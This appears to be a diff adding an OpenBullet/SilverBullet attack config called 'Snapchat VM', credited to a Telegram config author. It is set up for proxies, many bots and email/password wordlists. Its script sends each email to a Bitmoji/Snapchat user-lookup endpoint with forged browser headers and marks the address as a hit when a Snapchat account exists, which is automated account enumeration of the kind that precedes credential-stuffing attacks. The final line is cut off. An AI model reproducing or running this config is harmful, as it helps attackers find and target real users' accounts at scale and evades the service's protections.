@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "ꜱɴᴀᴘᴄʜᴀᴛ ᴠᴍ",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-20T20:01:44.9965517+00:00",
+  "AdditionalInfo": "",
+  "Author": "@Alone_Devilz",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "@Join : @Silverbullet_Configs1",
+      "VariableName": "",
+      "Id": 427999621
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!#𝐒𝐍𝐀𝐏𝐂𝐇𝐀𝐓_𝐕𝐌 RECAPTCHA "https://google.com" "" -> VAR "" 
+
+#𝕷𝖔𝖌𝖎𝖓 REQUEST POST "https://bitmoji.api.snapchat.com/api/user/find" 
+  CONTENT "{\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fr-FR,fr;q=0.9" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 35" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "origin: https://www.bitmoji.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.bitmoji.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+
+#𝕶𝖊𝖞_𝕮𝖍𝖊𝖈𝖐 KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"account_type\":\"snapchat\"}" 
+  KEYCHAIN Failure OR 
+    KEY "account_type\":\"bitmoji\"}" 
+    KEY "<RESPONSECODE>" EqualTo "204" 
+
+#𝔸𝕦𝕥𝕙𝕠𝕣 FUNCTION Constant "@Alone_Devilz" -> CAP "Configs by : " 
+
+#𝕁𝕠𝕚𝕟_ℙ𝕣𝕚𝕧𝕒𝕥𝕖_𝕔𝕙𝕒𝕟𝕟𝕖𝕝_𝕒𝕥_𝟡$ FUNCTION Constant 
+
